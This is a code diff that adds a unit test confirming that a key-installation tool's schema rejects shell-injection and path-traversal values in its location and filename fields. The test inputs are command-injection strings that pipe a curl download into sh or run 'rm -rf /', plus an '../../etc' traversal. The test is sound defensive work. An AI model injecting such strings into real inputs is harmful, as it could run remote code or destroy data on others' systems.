@@ -103,6 +103,15 @@ describe("key verbs", () => {
     });
   });
 
+  it("rejects a location or filename carrying shell metacharacters", () => {
+    const { ports } = makePorts();
+    const schema = tool(ports, "key_add_to_host").schema;
+    expect(schema.safeParse({ key_id: "k1", connection_id: "c1", location: ".ssh'; curl x|sh; echo '" }).success).toBe(false);
+    expect(schema.safeParse({ key_id: "k1", connection_id: "c1", filename: "authorized_keys; rm -rf /" }).success).toBe(false);
+    expect(schema.safeParse({ key_id: "k1", connection_id: "c1", location: "../../etc" }).success).toBe(false);
+    expect(schema.safeParse({ key_id: "k1", connection_id: "c1", location: "/etc/ssh" }).success).toBe(true);
+  });
+
   it("passes through a caller-supplied location and filename", async () => {
     const addToHost = vi.fn(async () => {});
     const { ports } = makePorts({ keys: { addToHost } });
